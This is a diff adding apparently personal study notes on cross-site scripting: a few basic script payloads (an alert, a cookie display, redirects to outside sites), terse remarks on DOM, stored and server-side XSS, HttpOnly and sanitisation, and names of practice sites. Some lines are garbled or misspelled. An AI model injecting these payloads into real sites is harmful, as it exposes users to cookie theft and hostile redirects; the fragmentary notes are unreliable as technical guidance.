@@ -1,0 +1,24 @@
+<script>alert("Akshat Hacked You!");</script>
+
+<script>alert(document.cookie);</script>
+
+
+
+<script>location.replace("igetintopc.com");</script>
+
+
+<script>response.sendRedirect("http://netflix.com");</script>
+
+in a dom base is only on client side 
+but can be server side and storage side
+
+http only
+sanitiation
+
+
+
+demo.testfire
+aqutenix 
+mutaldae
+
+
